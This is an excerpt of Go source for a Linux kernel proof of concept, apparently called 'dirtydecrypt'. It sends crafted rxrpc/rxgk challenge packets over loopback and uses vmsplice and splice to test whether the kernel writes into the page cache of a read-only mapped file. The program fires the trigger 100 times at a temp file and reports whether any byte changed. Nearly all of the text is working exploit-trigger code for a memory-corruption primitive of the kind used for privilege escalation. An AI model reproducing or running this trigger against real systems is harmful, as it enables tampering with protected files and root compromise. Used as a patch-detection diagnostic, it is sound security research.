...
// Diagnostic: fire one rxgk trigger at a temp file and check if any byte changes.
...
const (
	...
	keyctlUnlink          = 9  // unlink from keyring - triggers GC when refcount hits 0
...
func marshalRxgkChallenge(nonce uint32) []byte {
	// rxgk_validate_challenge reads exactly 20 bytes via skb_copy_bits(skb, 28, buf, 20)
	// rxgk_issue_challenge fills 20 random bytes at conn+0x248 - no structured format
	b := make([]byte, 20)
...
func udpRecvWithTimeout(fd int, buf []byte, ms int) (int, *syscall.SockaddrInet4, error) {
...
func fire(targetFd int, fileOff int64, verbose bool) (byte, error) {
	...
	if err != nil {
		return 0, fmt.Errorf("add_key: %w", err)
	}
	defer func() {
		// Unlink from process keyring so refcount drops when rxrpc also releases
		syscall.Syscall(syscall.SYS_KEYCTL, keyctlUnlink, keyID, uintptr(uint32(keySpecProcessKeyring)))
	}() //nolint:errcheck

	portS := uint16(14000 + (seq%400)*2)
	portC := portS + 1

	udpSrv, err := setupUDPServer(portS)
	if err != nil {
		return 0, fmt.Errorf("udp :%d: %w", portS, err)
	}
	defer syscall.Close(udpSrv)

	rxCli, err := setupRxrpcClient(portC, keyname)
	if err != nil {
		return 0, fmt.Errorf("rxrpc :%d: %w", portC, err)
	}
	defer syscall.Close(rxCli)

	// initiate call
	data := []byte("PING")
	srx := sockaddrRxrpcBytes(0x1234, syscall.SOCK_DGRAM, 16, portS, [4]byte{127, 0, 0, 1})
	...
	msg := syscall.Msghdr{
		Name: &srx[0], Namelen: uint32(len(srx)),
		Iov: &iov, Iovlen: 1,
		Control: &cbuf[0], Controllen: uint64(len(cbuf)),
	}
	...
	syscall.Syscall(syscall.SYS_SENDMSG, uintptr(rxCli), uintptr(unsafe.Pointer(&msg)), 0) //nolint:errcheck
	unix.FcntlInt(uintptr(rxCli), syscall.F_SETFL, fl) //nolint:errcheck

	pkt := make([]byte, 2048)
	n, cliSA, err := udpRecvWithTimeout(udpSrv, pkt, 1500)
	if err != nil || n < 28 {
		return 0, fmt.Errorf("no CONNECT packet: %v", err)
	}
	...
	if verbose {
		fmt.Printf("  CONNECT: epoch=%08x cid=%08x call=%d svc=%d cliPort=%d\n",
			epoch, cid, callN, svcIn, cliPort)
	}

	const rxrpcPacketTypeACK = 2
	const rxrpcPacketTypeResponse = 7

	chHdr := rxrpcWireHeader{
		Epoch: epoch, Cid: cid, Serial: uint32(seq) << 16,
		Type: rxrpcPacketTypeChallenge, SecuIdx: rxgkSecurityIndex, ServiceID: svcIn,
	}
	...
	// drain - auth_state set at connection init, no need to wait for RESPONSE
	for i := 0; i < 3; i++ {
		rn, _, _ := udpRecvWithTimeout(udpSrv, pkt, 5)
		if verbose && rn >= 28 {
			fmt.Printf("  pkt[%d]: %d bytes type=%d\n", i, rn, pkt[20])
		}
	}
	...
	syscall.Connect(udpSrv, &syscall.SockaddrInet4{Port: int(cliPort), Addr: [4]byte{127, 0, 0, 1}}) //nolint:errcheck
	...
	iov2 := unix.Iovec{Base: &malBytes[0], Len: uint64(len(malBytes))}
	if _, err := unix.Vmsplice(p[1], []unix.Iovec{iov2}, 0); err != nil {
	...
	if _, err := unix.Splice(targetFd, &off, p[1], nil, rxgkMinPayload, unix.SPLICE_F_NONBLOCK); err != nil {
		return 0, fmt.Errorf("splice file->pipe: %w", err)
	}
	if _, err := unix.Splice(p[0], nil, udpSrv, nil, len(malBytes)+rxgkMinPayload, 0); err != nil {
		return 0, fmt.Errorf("splice pipe->udp: %w", err)
	}

	// drain client socket
	fl2, _ := unix.FcntlInt(uintptr(rxCli), syscall.F_GETFL, 0)
	unix.FcntlInt(uintptr(rxCli), syscall.F_SETFL, fl2|syscall.O_NONBLOCK) //nolint:errcheck
	recvBuf := make([]byte, 2048)
	for round := 0; round < 5; round++ {
		rn, _, err := syscall.Recvfrom(rxCli, recvBuf, 0)
		if rn > 0 || err != syscall.EAGAIN {
			break
		}
		time.Sleep(10 * time.Millisecond)
	}
	unix.FcntlInt(uintptr(rxCli), syscall.F_SETFL, fl2) //nolint:errcheck

	// read back what's now at fileOff
	var cur [1]byte
	unix.Pread(targetFd, cur[:], fileOff) //nolint:errcheck
	return cur[0], nil
}
...
func main() {
	...
	copy(ifr[:], "lo")
	syscall.Syscall(syscall.SYS_IOCTL, uintptr(s), unix.SIOCGIFFLAGS, uintptr(unsafe.Pointer(&ifr[0]))) //nolint:errcheck
	...
	syscall.Syscall(syscall.SYS_IOCTL, uintptr(s), unix.SIOCSIFFLAGS, uintptr(unsafe.Pointer(&ifr[0]))) //nolint:errcheck
	syscall.Close(s)

	// create a temp file filled with 0xff
	f, err := os.CreateTemp("", "dirtydecrypt-test-*")
	if err != nil {
		panic(err)
	}
	...
	f.Write(testData) //nolint:errcheck

	fd := int(f.Fd())
	mapSlice, err := unix.Mmap(fd, 0, 4096, unix.PROT_READ, unix.MAP_SHARED)
	if err != nil {
		panic(err)
	}

	// load rxrpc module before add_key("rxrpc") or it returns ENODEV
	if dummy, _, errno := syscall.Syscall(syscall.SYS_SOCKET, afRxrpc, syscall.SOCK_DGRAM, syscall.AF_INET); errno != 0 {
		fmt.Printf("socket(AF_RXRPC): %v - rxrpc module unavailable\n", errno)
		os.Exit(1)
	} else {
	...
	fmt.Printf("initial byte[0] = 0x%02x (want != 0xff to detect write)\n", mapSlice[0])

	// fire 100 times and track changes
	changed := 0
	fmt.Println("\nfiring 100 triggers at byte[0]...")
	for i := 0; i < 100; i++ {
		b, err := fire(fd, 0, i == 0)
		if err != nil {
			fmt.Printf("  fire %d: error: %v\n", i, err)
			continue
		}
		if b != 0xff {
			changed++
			fmt.Printf("  fire %d: byte[0] changed to 0x%02x!\n", i, b)
		}
	}

	if changed == 0 {
		fmt.Println("\n[!] no change after 100 fires - kernel is patched or trigger broken")
	} else {
		fmt.Printf("\n[+] %d/100 fires modified the page cache\n", changed)
	}

	fmt.Printf("mmap byte[0] after fires = 0x%02x\n", mapSlice[0])
	unix.Munmap(mapSlice) //nolint:errcheck
}
